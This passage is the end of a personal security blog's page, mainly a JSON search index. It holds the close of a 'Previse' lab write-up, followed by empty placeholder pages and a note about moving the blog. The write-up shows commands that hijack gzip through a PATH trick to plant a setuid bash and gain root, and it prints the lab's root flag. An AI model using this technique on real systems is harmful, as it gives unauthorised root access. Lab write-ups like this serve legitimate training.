cron, added to sudo so I can run as needed - we\u0026#39;ll fix it later when there\u0026#39;s time gzip -c /var/log/apache2/access.log \u0026gt; /var/backups/$(date --date=\u0026#34;yesterday\u0026#34; +%Y%b%d)_access.gz gzip -c /var/www/file_access.log \u0026gt; /var/backups/$(date --date=\u0026#34;yesterday\u0026#34; +%Y%b%d)_file_access.gz 11- We can put a script named gzip in the current workdir and execute access_backup.sh as root.\ncd /tmp # set gzip to be bash with setuid bit cat \u0026lt;\u0026lt; EOF \u0026gt; gzip #!/bin/bash cp /bin/bash /tmp/c chmod u+s /tmp/c EOF 12- Now /tmp/c is a setuid bash.\n/tmp/c -p # this flag sets the real userid as the effective userid root.txt: 23c44ab8465e7ff51a5fab75847e088b\n ", 
            "url": "\/labs\/previse\/"
        },
        
        
        
        "\/research\/": {
            
            "title": "Researches",
            "tags": [],
            "content": "", 
            "url": "\/research\/"
        },
        
        
        
        "\/research\/test\/": {
            
            "title": "Test",
            "tags": [],
            "content": "", 
            "url": "\/research\/test\/"
        },
        
        
        
        "\/general\/": {
            
            "title": "Generals",
            "tags": [],
            "content": "", 
            "url": "\/general\/"
        },
        
        
        
        "\/general\/migration\/": {
            
            "title": "Migration from previous blog",
            "tags": [],
            "content": "It\u0026rsquo;s been a while since I last wrote for my personal blog. Last year, while I was in 2nd year of Bachelor, I wrote more articles about Data Structures and Algorithms, and little things I found to be fancy about pentesting. After a year of self teaching and research, I\u0026rsquo;m now focusing more on reverse engineering, malware analysis and using data science for faster analysis. There are so many things that I want to know better, but I struggle because they are undocumented, and that\u0026rsquo;s why I decided to retake this. This blog is mainly for my own tracking but I hope it\u0026rsquo;s helpful for others and that I will update this more often!\nThe old blog is still stored at the master branch of RoundofThree/roundofthree.github.io.\n", 
            "url": "\/general\/migration\/"
        },
        
        
        
        "\/categories\/": {
            
            "title": "Categories",
            "tags": [],
            "content": "", 
            "url": "\/categories\/"
        },
        
        
        
        "\/search\/": {
            
            "title": "Search",
            "tags": [],
            "content": "", 
            "url": "\/search\/"
        },
        
    }
</script>
<script src="/assets/lunr.min.js"></script>
<script src="/assets/search.js"></script>
</div>
<footer class="footer">
<div class="footer__inner">
<div class="copyright copyright--user">
<span>Â© 2021 RoundofThree</span>
</div>
</div>
</footer>
<script src="/assets/main.js"></script>
<script src="/assets/prism.js"></script>
</div>
</body>
</html>
